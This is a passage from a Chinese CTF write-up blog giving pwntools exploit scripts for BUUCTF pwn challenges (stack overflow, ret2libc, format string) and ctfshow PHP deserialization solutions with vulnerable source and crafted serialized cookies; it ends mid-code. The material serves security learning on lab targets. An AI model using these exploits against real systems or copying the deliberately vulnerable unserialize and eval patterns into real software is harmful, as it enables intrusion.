<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27476</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input admin password:&quot;</span>,<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>) + p32(<span class="number">0x080484D0</span>) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(<span class="number">0x080482EA</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your operation:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input new log info:&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your operation:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="铁人三项-第五赛区-2018-rop"><a class="header-anchor" href="#铁人三项-第五赛区-2018-rop">¶</a>铁人三项(第五赛区)_2018_rop</h2>
<h3 id="知识点：栈溢出，ret2libc3-v3"><a class="header-anchor" href="#知识点：栈溢出，ret2libc3-v3">¶</a>知识点：栈溢出，ret2libc3</h3>
<p>checksec 检查为32位程序，丢进 ida 中分析<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%28%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA%29_2018_rop/CC1HR%40QZWW9%29KNNAGOPO%5DFL.png" alt=""><br>
第一个函数没有什么内容，看第二个函数 vulnerable_function<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%28%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA%29_2018_rop/F%29AQFC4L_Z%40%40TSE%60Z%7BUNTU1.png" alt=""><br>
很明显的栈溢出漏洞，双击 buf<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%28%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA%29_2018_rop/JFFA0P0U7KQA2EKS9W9H3%40P.png" alt=""><br>
定义的 buf 栈空间大小只有 0x88，而 read 函数允许读取 0x100大小的数据，程序中没有 system 和 /bin/sh，典型的 retlibc3 ，通过泄露 write 函数获得 libc 基址，编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27632</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload_1)</span><br><span class="line">write_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(hex(write_addr))</span><br><span class="line">libc_base = write_addr - <span class="number">0x0e56f0</span></span><br><span class="line">success(hex(libc_base))</span><br><span class="line">system_addr = libc_base + <span class="number">0x03cd10</span></span><br><span class="line">binsh_addr = libc_base + <span class="number">0x17b8cf</span></span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(<span class="number">0x08048199</span>) + p32(system_addr) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.sendline(payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf-2020-babyrop"><a class="header-anchor" href="#bjdctf-2020-babyrop">¶</a>bjdctf_2020_babyrop</h2>
<h3 id="知识点：栈溢出，ret2libc3-v4"><a class="header-anchor" href="#知识点：栈溢出，ret2libc3-v4">¶</a>知识点：栈溢出，ret2libc3</h3>
<p>checksec 检查是64位程序，ida 打开<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/bjdctf_2020_babyrop/%7DAU42G1NUGN%25~FEP1ML%298NW.png" alt=""><br>
buf 栈空间为 0x20 ，而 read 允许读取 0x64 大小的数据，造成栈溢出，并且程序中没有给出 system 和 /bin/sh，需要利用 puts 函数泄露 libc 版本，并计算偏移量得到 system 和 /bin/sh 的地址。这里 libc 版本在线网站没有查到，题目提示是 ubuntu16 版本，在 buu 的资源处下载即可<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/bjdctf_2020_babyrop/W5VG4F%607ZN%402TCNYDA%60V0BS.png" alt=""><br>
编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27512</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400733</span>) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>,payload_1)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">success(hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">payload_2 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400733</span>) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>,payload_2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf-2020-babystack2"><a class="header-anchor" href="#bjdctf-2020-babystack2">¶</a>bjdctf_2020_babystack2</h2>
<h3 id="知识点：栈溢出，ret2text，无符号整形"><a class="header-anchor" href="#知识点：栈溢出，ret2text，无符号整形">¶</a>知识点：栈溢出，ret2text，无符号整形</h3>
<p>checksec 检查为64位程序，ida 查看一下伪代码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/bjdctf_2020_babystack2/5IFOK9%5DZYS%24D4B%29_WRD4K1P.png" alt=""><br>
首先可以获取用户输入赋值给 nbytes 变量，第一个 if 判断要求有符号整形小于10，而后面的 read 读取的大小由前面 nbytes 决定，但这里为<code>unsigned int</code>，也就是无符号整形，可以绕过<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/bjdctf_2020_babystack2/QDSBR%40%24VZXJ1I~0%29ZN2B5ML.png" alt=""><br>
可以看到无符号整形为负数的时候，会变成<code>unsigned int</code>的最大值，所以我们只需要前面输入一个<code>-1</code>绕过 if 判断，后面增大 read 函数的读取大小，导致栈溢出。该程序中还有个后门函数 backdoor 可以利用，大大减少了难度，直接写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26738</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input the length of your name:\n&quot;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="number">0x0000000000400726</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What&#x27;s u name?\n&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj-fm"><a class="header-anchor" href="#jarvisoj-fm">¶</a>jarvisoj_fm</h2>
<h3 id="知识点：格式化字符串，覆盖内存"><a class="header-anchor" href="#知识点：格式化字符串，覆盖内存">¶</a>知识点：格式化字符串，覆盖内存</h3>
<p>格式化字符串漏洞不懂的可以看我的另一篇博文学习：<a href="https://www.wlhhlc.top/posts/17489/">https://www.wlhhlc.top/posts/17489/</a></p>
<p>首先 checksec 检查为32位程序，并且开启了 canary 保护<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/jarvisoj_fm/8KOOZLIC9~FNM%7DZBXR1KF_R.png" alt=""><br>
用 ida 查看伪代码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/jarvisoj_fm/Q3%29O6_IE36%5BC%25F3DS9LL%5D44.png" alt=""><br>
可以看见存在格式化字符串漏洞，并且如果 X 的值等于4，就会直接执行<code>system(&quot;/bin/sh&quot;);</code>，所以我们需要覆盖 x 的值，ida 中双击 x 可以得到地址为<code>0x0804A02C</code>，接下来需要找格式化字符串在输出函数时是调用的第几个参数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/buuctf-pwn%E5%88%B7%E9%A2%98/jarvisoj_fm/4UNDA%28%407QT7~9ZLVORBLKVG.png" alt=""><br>
可以看到输入的 aaaa 的16进制形式在第 11 位，所以直接写exp即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27671</span>)</span><br><span class="line">x_addr = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">&quot;%11$n&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="等待更新"><a class="header-anchor" href="#等待更新">¶</a>等待更新</h2>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-Web1000题系列修炼(二)</title>
    <url>/posts/33757/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>重新开一篇啦，上一篇已经太长了，继续学习了…</p>
<h2 id="反序列化-254-278"><a class="header-anchor" href="#反序列化-254-278">¶</a>反序列化(254-278)</h2>
<h3 id="常见的魔术方法"><a class="header-anchor" href="#常见的魔术方法">¶</a>常见的魔术方法</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()，类的构造函数</span><br><span class="line"> </span><br><span class="line">__destruct()，类的析构函数</span><br><span class="line"> </span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"> </span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"> </span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"> </span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"> </span><br><span class="line">__isset()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line"> </span><br><span class="line">__unset()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line"> </span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数</span><br><span class="line"> </span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数</span><br><span class="line"> </span><br><span class="line">__toString()，类被当成字符串时的回应方法</span><br><span class="line"> </span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"> </span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"> </span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"> </span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"> </span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure>
<p>注意点：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">public          被序列化的时候属性名 不会更改</span><br><span class="line">protected       被序列化的时候属性名 会变成  %00*%00属性名</span><br><span class="line">private         被序列化的时候属性名 会变成  %00类名%00属性名</span><br></pre></td></tr></table></figure>
<h3 id="web254"><a class="header-anchor" href="#web254">¶</a>web254</h3>
<p>这题倒是和反序列化没什么关系，主要是看类的调用吧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $isVip=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$u,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===$u&amp;&amp;<span class="keyword">$this</span>-&gt;password===$p)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.$flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password=$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($username) &amp;&amp; <span class="keyword">isset</span>($password))&#123;</span><br><span class="line">    $user = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">if</span>($user-&gt;login($username,$password))&#123;</span><br><span class="line">        <span class="keyword">if</span>($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>传入两个get参数，分别是<code>username</code>和<code>password</code>，然后用new实例化<code>ctfShowUser</code>这个类，接着调用<code>login</code>这个方法，可以看到如果用户名和密码都正确的话就把true赋值给<code>isVip</code>，然后就是进入<code>checkVip</code>和<code>vipOneKeyGetFlag</code>方法获得flag。所以payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx</span><br></pre></td></tr></table></figure>
<h3 id="web255"><a class="header-anchor" href="#web255">¶</a>web255</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $isVip=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$u,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===$u&amp;&amp;<span class="keyword">$this</span>-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.$flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password=$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($username) &amp;&amp; <span class="keyword">isset</span>($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>($user-&gt;login($username,$password))&#123;</span><br><span class="line">        <span class="keyword">if</span>($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题和上一题的区别是在类里面没有对<code>isVip</code>属性进行赋值<code>true</code>，所以我们需要想办法把<code>isVip</code>赋值成<code>true</code>才能获得flag；观察可以看到会对<code>cookie</code>中的<code>user</code>进行反序列化，所以这里是一个漏洞点，我们可以往这里传入序列化的字符串，通过反序列化把<code>isVip</code>赋值成true。<br>
本地新建一个php文件，对类<code>ctfShowUser</code>赋值，然后进行序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> $isVip=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web255/3NX_IIN%60F%60%24RNGXZW6SVZZT.png" alt=""><br>
运行后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
<p>记得用bp的话要进行一个url编码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web255/_G%7BLZ%5D3IX1XV0C2O%28ZJ%24K~0.png" alt=""></p>
<h3 id="web256"><a class="header-anchor" href="#web256">¶</a>web256</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $isVip=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$u,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===$u&amp;&amp;<span class="keyword">$this</span>-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.$flag;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password=$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($username) &amp;&amp; <span class="keyword">isset</span>($password))&#123;</span><br><span class="line">    $user = unserialize($_COOKIE[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>($user-&gt;login($username,$password))&#123;</span><br><span class="line">        <span class="keyword">if</span>($user-&gt;checkVip())&#123;</span><br><span class="line">            $user-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和上一题差不多，只是在获取flag的时候多了一层判断，即用户名和密码不一样，我们自己序列化的时候改一下账号和密码就好了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $username=<span class="string">&#x27;dotast&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> $password=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> $isVip=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行后得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;dotast&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/web1000%28%E4%BA%8C%29/web256/31%60GRJOVOZG%5DK%40%60%60G%29IE7%29I.png" alt=""></p>
<h3 id="web257"><a class="header-anchor" href="#web257">¶</a>web257</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $isVip=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> $class = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$u,$p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===$u&amp;&amp;<span class="keyword">$this</span>-&gt;password===$p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $user=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username=$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password=$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span 